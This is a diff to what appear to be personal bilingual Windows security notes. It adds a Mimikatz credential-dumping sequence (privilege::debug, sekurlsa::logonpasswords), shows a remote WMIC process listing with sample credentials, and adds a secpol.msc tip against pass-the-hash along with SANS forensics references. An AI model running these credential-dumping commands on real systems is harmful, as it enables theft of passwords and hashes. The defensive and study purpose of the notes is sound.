@@ -1,3 +1,11 @@
+Dumping Hashes
+
+""""""""""""""""""""""""""""""""""""""""""""""""""Mimikatz"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+>>mimikatz.exe
+>>privilege::debug
+>>sekurlsa::logonpasswords
+...................muchos hashes y passwords...........
+
 
 
 
@@ -44,7 +52,12 @@ Crear un proceso
 Listar procesos
 >>WMIC /node:192.9.200.10 /user:admin /password:pass process get /format:list
 
+"""""""""""""""""""""""""""""""""""""""""""""""""""Secpol.msc""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
 
+Stop PasssTheHash
+Secpol.msc/LocalPolicies/UserRightsAssignments/DebugPrograms       Delete Administrator/System
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
 
 
 Nota: Datos: 
@@ -52,6 +65,7 @@ Nota: Datos:
 -Logs Files are stored in %System32%winevt%logs
 -Referencia: https://www.sans.org/reading-room/whitepapers/forensics/windows-logon-forensics-34132
              https://www.sans.org/reading-room/whitepapers/logging/evtx-windows-event-logging-32949
+-Directivas de Seguridad Local En WIN : secpol.msc
              
 
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
